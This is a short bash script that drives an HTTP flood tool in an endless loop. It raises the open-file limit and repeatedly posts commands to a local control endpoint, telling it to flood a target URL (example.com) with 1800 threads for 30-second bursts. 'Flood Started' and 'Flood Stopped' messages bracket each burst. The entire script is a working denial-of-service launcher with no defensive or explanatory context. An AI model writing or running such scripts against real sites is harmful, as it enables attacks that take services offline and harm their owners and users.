process=1
ulimit -n 999999

while true
do
    echo Flood Started
    for ((i=1;i<=$process;i++))
    do
        curl -X POST -d "url=https://example.com/&threads=1800&timer=30" http://localhost:8080/command
        sleep 0.1
    done
    sleep 15
    echo Flood Stopped!!
done
